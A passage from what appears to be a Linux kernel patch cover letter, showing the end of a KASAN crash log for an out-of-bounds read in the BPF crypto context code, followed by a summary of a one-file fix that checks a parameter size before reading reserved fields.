+[    1.544970]  dump_stack_lvl+0x4d/0x70
+[    1.544977]  print_report+0x14b/0x4b0
+[    1.544983]  ? __pfx__raw_spin_lock_irqsave+0x10/0x10
+[    1.544990]  kasan_report+0xfa/0x120
+[    1.544995]  ? bpf_crypto_ctx_create+0x811/0xaf0
+[    1.544999]  ? bpf_crypto_ctx_create+0x811/0xaf0
+[    1.545003]  bpf_crypto_ctx_create+0x811/0xaf0
+[    1.545007]  ? srso_alias_return_thunk+0x5/0xfbef5
+[    1.545011]  bpf_prog_1a0a06253873ed44_trigger+0x60/0x78
+[    1.545015]  bpf_prog_test_run_syscall+0x42e/0x9f0
+[    1.545023]  ? srso_alias_return_thunk+0x5/0xfbef5
+[    1.545026]  ? __pfx_bpf_prog_test_run_syscall+0x10/0x10
+[    1.545028]  ? srso_alias_return_thunk+0x5/0xfbef5
+[    1.545031]  ? __pfx_bpf_check_uarg_tail_zero+0x10/0x10
+[    1.545036]  ? srso_alias_return_thunk+0x5/0xfbef5
+[    1.545040]  __sys_bpf+0x12c3/0x5280
+[    1.545044]  ? __pfx___sys_bpf+0x10/0x10
+[    1.545047]  ? stack_depot_save_flags+0x2d/0x970
+[    1.545054]  ? stack_depot_save_flags+0x2d/0x970
+[    1.545057]  ? task_work_run+0x12c/0x230
+[    1.545062]  ? exit_to_user_mode_loop+0x135/0x520
+[    1.545067]  ? do_syscall_64+0x34e/0x4b0
+[    1.545073]  ? srso_alias_return_thunk+0x5/0xfbef5
+[    1.545076]  ? do_syscall_64+0x34e/0x4b0
+[    1.545079]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[    1.545082]  ? __pfx_do_vmi_align_munmap+0x10/0x10
+[    1.545097]  __x64_sys_bpf+0xc4/0x180
+[    1.545101]  ? srso_alias_return_thunk+0x5/0xfbef5
+[    1.545103]  ? fpregs_assert_state_consistent+0x56/0xe0
+[    1.545108]  do_syscall_64+0xde/0x4b0
+[    1.545111]  ? srso_alias_return_thunk+0x5/0xfbef5
+[    1.545115]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[    1.545118] RIP: 0033:0x53ff3d
+[    1.545121] Code: b3 66 2e 0f 1f 84 00 00 00 00 00 66 90 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
+[    1.545124] RSP: 002b:00007ffd3b599d38 EFLAGS: 00000246 ORIG_RAX: 0000000000000141
+[    1.545129] RAX: ffffffffffffffda RBX: 00007ffd3b599e20 RCX: 000000000053ff3d
+[    1.545131] RDX: 0000000000000050 RSI: 00007ffd3b599d40 RDI: 000000000000000a
+[    1.545133] RBP: 000000003a91e940 R08: 0000000000000004 R09: 0000000000000005
+[    1.545135] R10: 00007ffd3b599e20 R11: 0000000000000246 R12: 00007ffd3b599ed0
+[    1.545137] R13: 00007ffd3b69a018 R14: 00000000005f6068 R15: 0000000000000001
+[    1.545141]  </TASK>
+[    1.545143] 
+[    1.545144] Allocated by task 92:
+[    1.545146]  kasan_save_stack+0x2f/0x50
+[    1.545150]  kasan_save_track+0x14/0x30
+[    1.545152]  __kasan_kmalloc+0x7f/0x90
+[    1.545155]  __kmalloc_node_noprof+0x1de/0x4b0
+[    1.545159]  alloc_bulk+0x242/0x3b0
+[    1.545163]  bpf_mem_alloc_init+0x2a9/0x7e0
+[    1.545165]  htab_map_alloc+0xcb8/0x1290
+[    1.545169]  map_create+0x50d/0x1b30
+[    1.545172]  __sys_bpf+0x1e3f/0x5280
+[    1.545174]  __x64_sys_bpf+0xc4/0x180
+[    1.545177]  do_syscall_64+0xde/0x4b0
+[    1.545179]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[    1.545182] 
+[    1.545183] The buggy address belongs to the object at ffff888102fbee00
+[    1.545183]  which belongs to the cache kmalloc-96 of size 96
+[    1.545185] The buggy address is located 6 bytes to the right of
+[    1.545185]  allocated 72-byte region [ffff888102fbee00, ffff888102fbee48)
+[    1.545188] 
+[    1.545189] The buggy address belongs to the physical page:
+[    1.545191] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x102fbe
+[    1.545194] flags: 0x200000000000000(node=0|zone=2)
+[    1.545198] page_type: f5(slab)
+[    1.545202] raw: 0200000000000000 ffff888100042280 dead000000000100 dead000000000122
+[    1.545205] raw: 0000000000000000 0000000000200020 00000000f5000000 0000000000000000
+[    1.545206] page dumped because: kasan: bad access detected
+[    1.545209] 
+[    1.545210] Memory state around the buggy address:
+[    1.545212]  ffff888102fbed00: 00 00 00 00 00 00 00 00 00 fc fc fc fc fc fc fc
+[    1.545214]  ffff888102fbed80: 00 00 00 00 00 00 00 00 00 fc fc fc fc fc fc fc
+[    1.545215] >ffff888102fbee00: 00 00 00 00 00 00 00 00 00 fc fc fc fc fc fc fc
+[    1.545217]                                               ^
+[    1.545218]  ffff888102fbee80: 00 00 00 00 00 00 00 00 00 fc fc fc fc fc fc fc
+[    1.545220]  ffff888102fbef00: 00 00 00 00 00 00 00 00 00 fc fc fc fc fc fc fc
+[    1.545222] ==================================================================
+[    1.545240] Kernel panic - not syncing: KASAN: panic_on_warn set ...
+
+-----END crash log-----
+
+Best regards,
+Yuqi Xu
+
+Yuqi Xu (1):
+  bpf: crypto: check params size before reading reserved fields
+
+ kernel/bpf/crypto.c | 5 +++--
+ 1 file changed, 3 insertions(+), 2 deletions(-)
+
+
+base-commit: e3b6cb020e2f034a98068b2d11bcb3db9fff7e42
+-- 
+2.55.0
+
